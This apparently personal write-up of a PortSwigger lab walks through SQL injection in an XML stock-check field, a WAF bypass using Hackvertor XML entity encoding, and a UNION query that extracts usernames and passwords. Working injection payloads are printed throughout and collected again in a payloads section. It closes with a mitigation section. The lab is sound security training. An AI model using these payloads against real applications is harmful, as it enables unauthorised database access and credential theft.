# PortSwigger Lab: SQL Injection with Filter Bypass via XML Encoding

**Difficulty:** Practitioner    
**Date:** 31 August 2026  
**Category:** SQL Injection / WAF Bypass  
**Tools:** Burp Suite, Hackvertor

---

## 1. Lab Objective

The application contains a SQL injection vulnerability in the stock check feature.

The stock check request sends `productId` and `storeId` inside an XML document.

The goal was to:

1. Identify the SQL injection in `storeId`.
2. Determine the number of columns returned by the query.
3. Bypass the Web Application Firewall (WAF).
4. Use a UNION-based SQL injection to retrieve usernames and passwords from the `users` table.
5. Log in as the administrator and solve the lab.

---

## 2. Initial Request

After opening a product and clicking **Check stock**, Burp captured:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>7</productId>
    <storeId>1</storeId>
</stockCheck>
```

The interesting parameter was:

```xml
<storeId>1</storeId>
```

---

## 3. Send the Request to Repeater

### Steps

1. Open the lab in Burp Browser.
2. Open any product.
3. Click **Check stock**.
4. Capture the `POST /product/stock` request.
5. Right-click the request.
6. Select **Send to Repeater**.
7. Open the **Repeater** tab.

---

## 4. Test for SQL Injection

I changed:

```xml
<storeId>1</storeId>
```

to:

```xml
<storeId>1+1</storeId>
```

The application returned a different stock value.

### Result

This showed that the `storeId` input was being evaluated by the backend and was potentially vulnerable to SQL injection.

---

## 5. Test the UNION Query

I then tested:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

The response was:

```http
HTTP/2 403 Forbidden
```

with:

```text
"Attack detected"
```

This confirmed that a WAF was detecting the obvious SQL injection payload.

---

## 6. Bypass the WAF with Hackvertor

I installed the **Hackvertor** Burp extension.

### Steps

1. Highlight the SQL payload:

```text
1 UNION SELECT NULL
```

2. Right-click.
3. Select:

**Extensions → Hackvertor → Encode → dec_entities**

4. Send the modified request.

### Result

The response changed from:

```text
403 Forbidden
Attack detected
```

to:

```text
HTTP/2 200 OK
```

The response contained:

```text
446 units
null
```

This confirmed that the WAF bypass worked.

---

## 7. Determine the Number of Columns

The successful response to:

```sql
1 UNION SELECT NULL
```

showed that the UNION query was accepted.

The result indicated that the original query returned **one column**.

---

## 8. Extract Usernames and Passwords

Because only one column was available, I concatenated the username and password into one value:

```sql
1 UNION SELECT username || '~' || password FROM users
```

I placed this payload inside the Hackvertor XML entity encoding wrapper.

Conceptually:

```xml
<storeId>
    <dec_entities>
        1 UNION SELECT username || '~' || password FROM users
    </dec_entities>
</storeId>
```

### Result

The response returned records including:

```text
administrator~[password]
carlos~[password]
wiener~[password]
```

I intentionally did not record the actual password in this README.

---

## 9. Administrator Login

I used:

**Username:**

```text
administrator
```

**Password:**

The password returned beside `administrator~` in the Burp response.

After submitting the credentials, I was authenticated as the administrator.

---

## 10. Lab Result

The lab displayed:

> **LAB — Solved**

**Completed successfully**

---

## 11. Attack Flow

```text
Check Stock
    ↓
POST /product/stock
    ↓
Identify storeId
    ↓
Test 1+1
    ↓
SQL injection confirmed
    ↓
UNION SELECT NULL
    ↓
WAF → 403 Attack detected
    ↓
Hackvertor XML entity encoding
    ↓
WAF bypass → 200 OK
    ↓
Confirm one-column UNION
    ↓
Extract users table
    ↓
username || '~' || password
    ↓
Administrator credentials
    ↓
Login as administrator
    ↓
✅ LAB SOLVED
```

---

## 12. What I Learned

### SQL Injection

SQL injection occurs when untrusted user input is inserted into a SQL query without proper protection.

### UNION-Based SQL Injection

`UNION SELECT` can be used to append another query to the original query when the column count and data types are compatible.

### Column Enumeration

Testing:

```sql
UNION SELECT NULL
```

helped determine that the query returned one column.

### WAF

A Web Application Firewall can detect and block obvious SQL injection patterns.

In this lab, the plain-text payload produced:

```text
403 Attack detected
```

### XML Entity Encoding

Because the injection point was inside XML, XML entity encoding was used to obfuscate the SQL from the WAF.

The XML parser then decoded the entities before the backend processed the value.

### Data Concatenation

Since only one column was available, the username and password were combined:

```sql
username || '~' || password
```

This allowed both values to be returned through the single column.

---

## 13. Payloads Practiced

### Expression test

```text
1+1
```

### UNION column test

```sql
1 UNION SELECT NULL
```

### Final extraction query

```sql
1 UNION SELECT username || '~' || password FROM users
```

---

## 14. Burp Suite Workflow

```text
Burp Browser
    ↓
Open product
    ↓
Check stock
    ↓
Capture POST /product/stock
    ↓
Send to Repeater
    ↓
Modify storeId
    ↓
Send request
    ↓
Analyze response
```

---

## 15. Security Mitigation

The main fix for this vulnerability is to use **parameterized queries / prepared statements**.

Additional protections include:

- Validate `storeId` against the expected data type and allowed values.
- Never concatenate user input directly into SQL queries.
- Use least-privilege database accounts.
- Validate XML input before using values in database queries.
- Treat WAF protection as an additional security layer, not the primary defense.

---

